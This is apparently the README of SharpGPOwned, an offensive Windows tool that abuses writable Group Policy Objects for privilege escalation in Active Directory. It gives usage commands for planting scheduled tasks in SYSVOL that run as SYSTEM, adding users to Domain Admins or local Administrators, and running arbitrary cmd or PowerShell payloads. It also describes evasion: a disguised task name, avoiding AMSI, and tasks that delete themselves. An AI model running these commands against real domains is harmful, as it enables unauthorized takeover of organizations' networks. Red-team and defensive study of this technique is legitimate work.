# SharpGPOwned

.NET port of [Invoke-GPOwned](https://github.com/n0troot/Invoke-GPOwned). Two standalone EXEs — no PowerShell, no AMSI surface.

**GPRecon.exe** — enumerate GPOs and find ones you can write to  
**GPOwned.exe** — exploit writable GPOs for privilege escalation

---

## How it works

Write access to a GPO = write access to SYSVOL. GPOwned drops a GPP ImmediateTask into `ScheduledTasks.xml` under `SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\ScheduledTasks\`. On the next Group Policy refresh — or immediately after bumping the version counter — the task fires as `NT AUTHORITY\SYSTEM` on every machine in the linked OUs.

```
Attacker                         SYSVOL / DC
   │                                  │
   ├── write ScheduledTasks.xml ──────►│
   ├── bump versionNumber + GPT.INI ──►│
   │                                  │
   │           ~90 min later          │       Target
   │                                  │────── gpupdate ──►│
   │                                  │◄───── GPO pull ───┤
   │                                  │                   └─ run XboxLiveUpdate as SYSTEM
   │◄── verify ────────────────────────────────────────────┘
```

---

## Two-task (multitasking) technique

The `--stx` flag enables a two-stage execution chain. Instead of having the primary GPO task run the payload directly, it runs `add.bat`, which calls `Register-ScheduledTask` to register a second local task (`XboxLiveUpdateWatchdog`) from a sideloaded XML template (`wsadd.xml`).

```
SYSVOL GPO task (XboxLiveUpdate — SYSTEM)
   │
   └─► add.bat
          └─► Register-ScheduledTask -Xml wsadd.xml
                    │
                    │   5 seconds later
                    │
                    └─► XboxLiveUpdateWatchdog (Users / HighestAvailable)
                               └─► payload executes
```

**Why two tasks?**

- **Context switching** — the GPO task runs as `NT AUTHORITY\SYSTEM` but some payloads need to run inside a specific user's interactive session (e.g. a DA logged into a workstation). The watchdog runs under `S-1-5-32-545` (local Users, `HighestAvailable`), letting it inherit the active session.
- **Indirection** — the primary task only writes `add.bat` and `wsadd.xml` to disk; the actual payload is never in SYSVOL.
- **Timing control** — the `PT5S` registration delay lets the primary task self-delete before the watchdog fires, leaving minimal overlap in the task scheduler.

**Self-deletion:** primary deletes via `DeleteExpiredTaskAfter=PT1M`, watchdog deletes via `EndBoundary` set to T+1 min at injection time.

---

## Requirements

- .NET Framework 4.8 (pre-installed on Windows 10 / Server 2019+)
- Domain-joined host with an authenticated domain session
- Write access to at least one GPO (find with GPRecon.exe)
- `GPOwned.Shared.dll` must be in the same folder as both EXEs

---

## GPRecon

Enumerates GPOs via SYSVOL, tests ACLs against the current user, and maps linked OUs.

```
GPRecon.exe --all
GPRecon.exe --all --vulnerable
GPRecon.exe --all --full
GPRecon.exe --gpo "Default Domain Policy"
GPRecon.exe --gpo {31B2F340-016D-11D2-945F-00C04FB984F9} --full
```

| Flag | Description |
|------|-------------|
| `--all` | Scan all GPOs in the domain |
| `--gpo <name\|GUID>` | Check a specific GPO by name or GUID |
| `--vulnerable` | Only output writable GPOs (use with `--all`) |
| `--full` | Also enumerate computers in each linked OU |

---

## GPOwned

### Identify the GPO

Supply either flag — one is required:

```
--guid {3875477A-B67F-4D7B-A524-AE01E5675ADD}
--gpo  "Default Domain Policy"
```

### Payload flags

One is required:

| Flag | Effect |
|------|--------|
| `--da` | Add `--user` to Domain Admins via the target DC |
| `--local` | Add `--user` to local Administrators on `--computer` |
| `--cmd <args>` | Run `cmd.exe <args>` as SYSTEM |
| `--ps <cmd>` | Run `powershell.exe <cmd>` as SYSTEM |

Single quotes in `--cmd` / `--ps` / `--scmd` / `--sps` arguments are converted to double quotes in the generated XML automatically — no shell-escaping gymnastics needed.

### Target / identity flags

| Flag | Required | Default | Description |
|------|----------|---------|-------------|
| `--computer` / `-c` | ✓ | — | Target machine FQDN |
| `--user` / `-u` | for `--da`/`--local` | — | User to elevate |
| `--domain` / `-d` | | forest root | Domain FQDN |
| `--author` / `-a` | | auto-detected DA | Account name for task `Author` field |
| `--interval` / `-int` | | 90 | Minutes to poll for execution |

### Second-task flags (`--stx`)

```
--stx <path|.>    wsadd.xml path; . = use the embedded template
--scmd <args>     CMD args for the watchdog task
--sps <cmd>       PowerShell command for the watchdog task
```

### Misc flags

```
--xml <path>    custom ScheduledTasks.xml template (default: embedded)
--log <path>    tee all output to a log file
```

---

## Examples

**DA escalation via a DC-linked GPO:**
```
GPOwned.exe --gpo "Default Domain Policy" --computer dc01.corp.local --user jdoe --da
```

**Local admin on a workstation:**
```
GPOwned.exe --guid {3875477A-B67F-4D7B-A524-AE01E5675ADD} --computer ws01.corp.local --user jdoe --local
```

**Custom CMD payload:**
```
GPOwned.exe --gpo "MyGPO" --computer dc01.corp.local --cmd "/c whoami > C:\out.txt"
```

**Two-task technique — DA session via workstation GPO:**
```
GPOwned.exe --guid {D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA} ^
  --computer pc01.corp.local --author DAUser --stx . ^
  --scmd "/r net group 'Domain Admins' jdoe /add /dom"
```
The single quotes around `Domain Admins` become double quotes in the XML — no extra escaping needed.

---

## Building from source

**Using the included batch script** (requires `csc.exe` at `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\`):
```
cd src
build.bat
```

**Using dotnet build** (.NET SDK 4.8+):
```
cd src\Shared  && dotnet build -c Release
cd src\GPOwned && dotnet build -c Release
cd src\GPRecon && dotnet build -c Release
```

Output in `src\bin\`.

---

## Credits

Original technique and PowerShell implementation: [@n0troot](https://github.com/n0troot) — [Invoke-GPOwned](https://github.com/n0troot/Invoke-GPOwned)

The one who thought of the name of the tool before me(without me knowing), great minds think alike: [@X-C3LL](https://github.com/X-C3LL) — [GPOwned](https://github.com/X-C3LL/GPOwned)
